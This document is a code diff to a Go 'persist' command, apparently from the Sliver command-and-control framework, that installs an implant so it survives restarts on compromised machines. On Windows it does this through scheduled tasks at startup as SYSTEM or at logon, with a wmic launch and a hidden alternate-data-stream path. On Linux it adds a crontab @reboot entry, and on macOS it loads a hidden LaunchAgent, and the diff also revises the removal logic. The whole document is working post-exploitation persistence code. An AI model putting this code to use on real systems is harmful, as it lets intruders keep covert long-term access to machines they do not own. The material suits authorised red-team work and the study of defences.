@@ -45,7 +45,40 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		fmt.Printf(Info+"Sliver not specified. Defaulting to %s\n", sliver)
 	}
 	stageOS := session.OS
+
+	// Windows specific environment variables
 	homedrive := ""
+	systemroot := ""
+	if stageOS == "windows" {
+		// %HOMEDRIVE% Variable expansion
+		resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
+			Name:    "HOMEDRIVE",
+			Request: ActiveSession.Request(ctx),
+		})
+		if err != nil {
+			fmt.Printf(Warn+"Error: %v\n", err)
+			return
+		}
+		if len(resp.Variables) == 1 {
+			homedrive = resp.Variables[0].Value
+		} else {
+			homedrive = "C:"
+		}
+		// %SYSTEMROOT% Variable expansion
+		resp, err = rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
+			Name:    "SYSTEMROOT",
+			Request: ActiveSession.Request(ctx),
+		})
+		if err != nil {
+			fmt.Printf(Warn+"Error: %v\n", err)
+			return
+		}
+		if len(resp.Variables) == 1 {
+			systemroot = resp.Variables[0].Value
+		} else {
+			systemroot = homedrive + "\\Windows"
+		}
+	}
 
 	// Fixup path
 	if path == "" {
@@ -57,25 +90,11 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			// Key Not Found
 			switch stageOS {
 			case "windows":
-				// %HOMEDRIVE% Variable expansion
-				resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
-					Name:    "HOMEDRIVE",
-					Request: ActiveSession.Request(ctx),
-				})
-				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
-					return
-				}
-				if len(resp.Variables) == 1 {
-					homedrive = resp.Variables[0].Value
-				} else {
-					homedrive = "C:"
-				}
 				if session.Username == "NT AUTHORITY\\SYSTEM" {
 					path = homedrive + "\\:" + sliver + ".exe"
 				} else {
 					// %HOMEPATH% Variable expansion
-					resp, err = rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
+					resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
 						Name:    "HOMEPATH",
 						Request: ActiveSession.Request(ctx),
 					})
@@ -85,8 +104,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					}
 					if len(resp.Variables) == 1 {
 						path = resp.Variables[0].Value
-					}
-					if path == "" {
+					} else {
 						user := strings.Split(session.Username, "\\")
 						path = "\\Users\\" + user[len(user)-1]
 					}
@@ -120,6 +138,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 	if ctx.Flags.Bool("unload") {
 		switch stageOS {
 		case "windows":
+			fmt.Println(Info + "Info: Removing the file")
 			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
 				Path:      path,
 				Recursive: false,
@@ -128,17 +147,23 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			})
 			if err != nil {
 				fmt.Printf(Warn+"Error: %v\n", err)
-				return
+				// No return incase file was removed
+				// But task is still there
 			}
 
-			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-				Path:    homedrive + "\\Windows\\System32\\schtasks.exe",
+			fmt.Println(Info + "Info: Removing the task")
+			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+				Path:    systemroot + "\\System32\\schtasks.exe",
 				Args:    []string{"/delete", "/tn", sliver, "/f"},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
 			})
 			if err != nil {
 				fmt.Printf(Warn+"Error: %v\n", err)
+				return
+			}
+			if resp.Response != nil && resp.Response.Err != "" {
+				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 				return
 			}
 		case "linux":
@@ -179,7 +204,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 					return
 				}
 			} else {
-				_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+				resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 					Path:    "/bin/sh",
 					Args:    []string{"-c", "\"crontab -r\""},
 					Output:  false,
@@ -187,6 +212,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				})
 				if err != nil {
 					fmt.Printf(Warn+"Error: %v\n", err)
+					return
+				}
+				if resp.Response != nil && resp.Response.Err != "" {
+					fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 					return
 				}
 			}
@@ -219,7 +248,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			} else {
 				path = "/Users/" + session.Username + "/Library/LaunchAgents/." + sliver + ".plist"
 			}
-			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 				Path:    "/bin/launchctl",
 				Args:    []string{"unload", path},
 				Output:  false,
@@ -227,6 +256,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			})
 			if err != nil {
 				fmt.Printf(Warn+"Error: %v\n", err)
+				return
+			}
+			if resp.Response != nil && resp.Response.Err != "" {
+				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 				return
 			}
 
@@ -282,11 +315,11 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 
 	switch stageOS {
 	case "windows":
-		path = fmt.Sprintf("%s\\Windows\\System32\\Wbem\\wmic.exe process call create \"%s\"", path, homedrive)
+		path = fmt.Sprintf("%s\\System32\\Wbem\\wmic.exe process call create \"%s\"", systemroot, path)
 		if session.Username == "NT AUTHORITY\\SYSTEM" {
 			// Root persistence (schtasks)
-			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-				Path:    homedrive + "\\Windows\\System32\\schtasks.exe",
+			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+				Path:    systemroot + "\\System32\\schtasks.exe",
 				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onstart", "/ru", "System", "/f"},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
@@ -295,21 +328,29 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				fmt.Printf(Warn+"Error: %v\n", err)
 				return
 			}
+			if resp.Response != nil && resp.Response.Err != "" {
+				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				return
+			}
 		} else {
 			// User persistence (schtasks)
-			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-				Path:    homedrive + "\\Windows\\System32\\schtasks.exe",
+			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+				Path:    systemroot + "\\System32\\schtasks.exe",
 				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onlogon", "/f"},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
 			})
 			if err != nil {
-				fmt.Printf(Warn+"Err: %v\n", err)
+				fmt.Printf(Warn+"Error: %v\n", err)
+				return
+			}
+			if resp.Response != nil && resp.Response.Err != "" {
+				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 				return
 			}
 		}
 	case "linux":
-		_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+		resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 			Path:    "/bin/chmod",
 			Args:    []string{"0100", path},
 			Output:  false,
@@ -317,6 +358,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		})
 		if err != nil {
 			fmt.Printf(Warn+"Error: %v\n", err)
+			return
+		}
+		if resp.Response != nil && resp.Response.Err != "" {
+			fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 			return
 		}
 
@@ -348,7 +393,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			}
 		} else {
 			// User persistence (crontab)
-			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+			resp, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 				Path:    "/bin/sh",
 				Args:    []string{"-c", fmt.Sprintf("\"echo \\\"@reboot %s\\\" | crontab -\"", path)},
 				Output:  false,
@@ -358,9 +403,13 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 				fmt.Printf(Warn+"Error: %v\n", err)
 				return
 			}
+			if resp.Response != nil && resp.Response.Err != "" {
+				fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
+				return
+			}
 		}
 	case "darwin":
-		_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+		resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 			Path:    "/bin/chmod",
 			Args:    []string{"0100", path},
 			Output:  false,
@@ -368,6 +417,10 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		})
 		if err != nil {
 			fmt.Printf(Warn+"Error: %v\n", err)
+			return
+		}
+		if resp.Response != nil && resp.Response.Err != "" {
+			fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 			return
 		}
 
@@ -423,14 +476,18 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			return
 		}
 
-		_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+		resp, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 			Path:    "/bin/launchctl",
 			Args:    []string{"load", path},
 			Output:  false,
 			Request: ActiveSession.Request(ctx),
 		})
 		if err != nil {
-			fmt.Println(Warn + "failed to enable plist.")
+			fmt.Printf(Warn+"Error: %v\n", err)
+			return
+		}
+		if resp.Response != nil && resp.Response.Err != "" {
+			fmt.Printf(Warn+"Error: %s\n", resp.Response.Err)
 			return
 		}
 	}
